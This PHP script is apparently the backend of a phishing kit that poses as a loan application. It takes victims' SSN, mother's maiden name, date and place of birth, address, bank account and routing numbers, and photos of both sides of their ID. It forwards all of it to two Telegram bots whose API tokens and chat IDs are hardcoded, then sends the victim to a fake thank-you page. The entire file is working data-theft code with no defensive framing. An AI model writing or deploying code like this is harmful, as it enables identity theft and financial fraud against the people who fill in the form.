<?php

include 'firewall.php';

$telegram_bots = [
    [
        'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
        'chat_id' => '1325797388'
    ],
    [
        'token' => '7626186834:AAH1zXLXNUx6vuLr_E8ALbxAcve7Mr0TFj0',
        'chat_id' => '7521156137'
    ]
    // Add more bots here if needed
];


if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Get form inputs

    $desired_loan = htmlspecialchars($_POST['q87_desiredLoan87'] ?? '');
    $annual_income = htmlspecialchars($_POST['q88_annualIncome'] ?? '');

    $name_prefix = htmlspecialchars($_POST['q61_name']['prefix'] ?? '');
    $first_name = htmlspecialchars($_POST['q61_name']['first'] ?? '');
    $last_name = htmlspecialchars($_POST['q61_name']['last'] ?? '');
    $full_name = trim("$name_prefix $first_name $last_name");

    $email = htmlspecialchars($_POST['q78_email78'] ?? '');
    $phone = htmlspecialchars($_POST['q72_phone']['full'] ?? '');

    $birth_month = $_POST['q62_birthDate62']['month'] ?? '';
    $birth_day = $_POST['q62_birthDate62']['day'] ?? '';
    $birth_year = $_POST['q62_birthDate62']['year'] ?? '';
    $birth_date = "$birth_year-$birth_month-$birth_day";

    $address = htmlspecialchars($_POST['q76_address76']['addr_line1'] ?? '') . " " . 
                htmlspecialchars($_POST['q76_address76']['addr_line2'] ?? '') . ", " .
                htmlspecialchars($_POST['q76_address76']['city'] ?? '') . ", " .
                htmlspecialchars($_POST['q76_address76']['state'] ?? '') . ", " .
                htmlspecialchars($_POST['q76_address76']['postal'] ?? '');

    $marital_status = htmlspecialchars($_POST['q6_maritalStatus'] ?? '');
    $social_security = htmlspecialchars($_POST['q92_socialSecurity'] ?? '');

    $fathers_full_name = trim(htmlspecialchars($_POST['q105_fathersFull']['first'] ?? '') . " " . 
                            htmlspecialchars($_POST['q105_fathersFull']['last'] ?? ''));

    $mothers_full_name = trim(htmlspecialchars($_POST['q106_mothersFull']['first'] ?? '') . " " . 
                            htmlspecialchars($_POST['q106_mothersFull']['last'] ?? ''));

    $place_of_birth = htmlspecialchars($_POST['q107_placeofbirth'] ?? '');
    $mothers_maiden_name = htmlspecialchars($_POST['q108_mothersmaiden'] ?? '');

    $present_employer = htmlspecialchars($_POST['q113_presentEmployer'] ?? '');
    $occupation = htmlspecialchars($_POST['q30_occupation'] ?? '');
    $years_of_experience = htmlspecialchars($_POST['q79_yearsOf'] ?? '');
    $gross_monthly_income = htmlspecialchars($_POST['q80_grossMonthly80'] ?? '');
    $monthly_rent_mortgage = htmlspecialchars($_POST['q81_monthlyRentmortgage'] ?? '');

    $institution_name = htmlspecialchars($_POST['q110_institutionName'] ?? '');
    $account_number = htmlspecialchars($_POST['q109_accountNumber'] ?? '');
    $routing_number = htmlspecialchars($_POST['q114_routingNumber'] ?? '');

    // $i_authorize = htmlspecialchars($_POST['q51_iAuthorize51'] ?? '');
    // $i_hereby_agree = htmlspecialchars($_POST['q52_iHereby'] ?? '');


    $timestamp = date("Y-m-d H:i:s");






    // Create the uploads directory if it doesn't exist
    $upload_dir = "uploads/";
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }

    // Function to process uploaded files
    function handleFileUpload($file_input_name, $file_prefix) {
        global $upload_dir;

        if (!empty($_FILES[$file_input_name]['name'][0])) {
            $original_filename = $_FILES[$file_input_name]['name'][0];
            $file_extension = pathinfo($original_filename, PATHINFO_EXTENSION);
            $new_filename = $file_prefix . "_" . time() . "." . $file_extension;
            $file_path = $upload_dir . $new_filename;

            if (move_uploaded_file($_FILES[$file_input_name]['tmp_name'][0], $file_path)) {
                return $file_path;
            }
        }
        return null;
    }


    // Handle file uploads
    $front_id_path = handleFileUpload('q94_uploadSelected94', 'front_id');
    $back_id_path = handleFileUpload('q95_uploadBack', 'back_id');




    // Function to send messages to multiple Telegram bots
    function sendMessageToTelegramBots($message, $bots) {
        foreach ($bots as $bot) {
            $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";

            $data = [
                'chat_id' => $bot['chat_id'],
                'text' => $message,
                'parse_mode' => 'Markdown'
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $telegram_url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }


    // Prepare message for Telegram
    $telegram_message = "📝 *New Loan Application*\n\n".
                        "  *Desired Loan:* $desired_loan\n".
                        "  *Annual Income:* $annual_income\n".
                      "👤 *Name:* $full_name\n".
                      "🎂 *Birth Date:* $birth_date\n".
                      "🏠 *Address:* $address\n".
                      "📧 *Email:* $email\n".
                      "📞 *Phone:* $phone\n".
                      "💼 *Occupation:* $occupation\n".
                      "📆 *Years of Experience:* $years_of_experience\n".
                      "💰 *Gross Monthly Income:* $gross_monthly_income\n".
                      "🏠 *Monthly Rent/Mortgage:* $monthly_rent_mortgage\n".
                      "🏦 *Institution Name:* $institution_name\n".
                      "💳 *Account Number:* $account_number\n".
                      "🔢 *Routing Number:* $routing_number\n".
                      "👨‍👩‍👦 *Marital Status:* $marital_status\n".
                      "👨 *Father's Full Name:* $fathers_full_name\n".
                      "👩 *Mother's Full Name:* $mothers_full_name\n".
                      "📍 *Place of Birth:* $place_of_birth\n".
                      "👩 *Mother's Maiden Name:* $mothers_maiden_name\n".
                      "🏢 *Present Employer:* $present_employer\n".
                      "🔐 *SSN:* $social_security\n".
                      "⏳ *Submitted At:* $timestamp\n".
                      "📎 *Identity Verification:* " . ($front_id_path && $back_id_path ? "✅ Uploaded" : "❌ Not Provided");



    // Send text message to Telegram
    sendMessageToTelegramBots($telegram_message, $telegram_bots);




   // Function to send files to multiple Telegram bots
    function sendFileToTelegramBots($file_path, $caption, $bots) {
        if (!file_exists($file_path) || filesize($file_path) == 0) {
            return; // Skip if the file is missing or empty
        }

        $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
        $image_extensions = ['jpg', 'jpeg', 'png', 'gif'];

        foreach ($bots as $bot) {
            $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/";

            if (in_array($file_extension, $image_extensions)) {
                $telegram_url .= "sendPhoto";
                $post_data = [
                    'chat_id' => $bot['chat_id'],
                    'photo' => new CURLFile(realpath($file_path)), 
                    'caption' => $caption,
                    'parse_mode' => 'Markdown'
                ];
            } else {
                $telegram_url .= "sendDocument";
                $post_data = [
                    'chat_id' => $bot['chat_id'],
                    'document' => new CURLFile(realpath($file_path)), 
                    'caption' => $caption,
                    'parse_mode' => 'Markdown'
                ];
            }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $telegram_url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);
        }
    }



    // Send files to Telegram
    sendFileToTelegramBots($front_id_path, "📎 *Front ID* uploaded by *$full_name*", $telegram_bots);
    sendFileToTelegramBots($back_id_path, "📎 *Back ID* uploaded by *$full_name*", $telegram_bots);



header("Location:https://upstartloans-elul.onrender.com/thankyou.html");

exit;
}
?>